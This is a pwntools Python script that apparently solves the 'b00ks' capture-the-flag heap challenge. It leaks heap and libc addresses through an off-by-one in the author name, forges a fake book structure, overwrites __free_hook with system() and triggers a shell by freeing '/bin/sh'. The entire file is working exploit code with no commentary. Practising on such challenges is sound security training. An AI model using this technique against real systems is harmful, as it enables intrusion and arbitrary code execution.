from pwn import *

binary = ELF("b00ks")
libc = binary.libc
io = process("./b00ks")


def createbook(name_size, name, des_size, des):
    io.readuntil(b"> ")
    io.sendline(b"1")
    io.readuntil(b": ")
    io.sendline(str(name_size).encode())
    io.readuntil(b": ")
    io.sendline(name)
    io.readuntil(b": ")
    io.sendline(str(des_size).encode())
    io.readuntil(b": ")
    io.sendline(des)

def printbook(id):
    io.readuntil(b"> ")
    io.sendline(b"4")
    io.readuntil(b": ")
    for i in range(id):
        book_id = int(io.readline()[:-1])
        io.readuntil(b": ")
        book_name = io.readline()[:-1]
        io.readuntil(b": ")
        book_des = io.readline()[:-1]
        io.readuntil(b": ")
        book_author = io.readline()[:-1]
    return book_id, book_name, book_des, book_author

def createname(name):
    io.readuntil(b"name: ")
    io.sendline(name)

def changename(name):
    io.readuntil(b"> ")
    io.sendline(b"5")
    io.readuntil(b": ")
    io.sendline(name)

def editbook(book_id, new_des):
    io.readuntil(b"> ")
    io.sendline(b"3")
    io.readuntil(b": ")
    io.writeline(str(book_id).encode())
    io.readuntil(b": ")
    io.sendline(new_des)

def deletebook(book_id):
    io.readuntil(b"> ")
    io.sendline(b"2")
    io.readuntil(b": ")
    io.sendline(str(book_id).encode())
    
createname(b"A" * 32)
createbook(0x40, b"a", 45, b"a")
createbook(0x21000, b"a", 0x21000, b"b")
#gdb.attach(io)
#io.interactive()
book_id_1, book_name, book_des, book_author = printbook(1)
print(b"leak book author:" + book_author)
book1_addr = u64(book_author[32:len(book_author)].ljust(8,b'\x00'))
log.success("book1_address:" + hex(book1_addr))
gdb.attach(io)
io.interactive()
payload = p64(1) + p64(book1_addr + 0x40) + p64(book1_addr + 0x38) + p64(0xffff)
editbook(book_id_1, payload)
changename(b"A" * 32)
book_id_1, book_name, book_des, book_author = printbook(1)
book2_des_addr = u64(book_name.ljust(8,b"\x00"))
book2_name_addr = u64(book_des.ljust(8,b"\x00"))
log.success("book2 name addr:" + hex(book2_name_addr))
log.success("book2 des addr:" + hex(book2_des_addr))
libc_base = book2_name_addr - 0x389010
log.success("libc base:" + hex(libc_base))
#gdb.attach(io)
free_hook = libc_base + libc.symbols["__free_hook"]
system_addr = libc_base + libc.symbols['system']
binsh_addr = 0
k = libc.search(b'/bin/sh')
for i in k:
    binsh_addr = i
binsh_addr = libc_base + binsh_addr
log.success("free_hook:" + hex(free_hook))
log.success("system addr:" + hex(system_addr))
editbook(1, p64(binsh_addr) + p64(free_hook))
editbook(2, p64(system_addr))
deletebook(2)
io.interactive()


    

